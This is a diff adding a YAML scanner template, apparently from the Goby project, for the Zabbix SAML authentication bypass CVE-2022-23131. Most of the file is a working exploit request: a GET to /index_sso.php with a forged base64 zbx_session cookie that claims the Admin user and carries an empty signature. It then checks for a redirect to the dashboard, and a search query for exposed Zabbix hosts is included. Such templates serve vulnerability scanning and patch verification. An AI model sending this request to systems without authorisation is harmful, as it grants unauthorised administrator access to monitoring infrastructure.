@@ -1,0 +1,18 @@
+name: zabbix-saml-cve-2022-23131身份认证绕过
+manual: true
+query: app="zabbix"
+transport: http
+rules:
+  r0:
+    request:
+      method: GET
+      path: /index_sso.php
+      headers:
+        Cookie: zbx_session=eyJzYW1sX2RhdGEiOnsidXNlcm5hbWVfYXR0cmlidXRlIjoiQWRtaW4ifSwic2Vzc2lvbmlkIjoiIiwic2lnbiI6IiJ9
+      follow_redirects: true
+    expression: response.status == 302 && response.raw_header.bcontains(b"dashboard")
+expression: r0()
+detail:
+  author: gobysec@gmail.com
+  links:
+  - https://gobies.org/
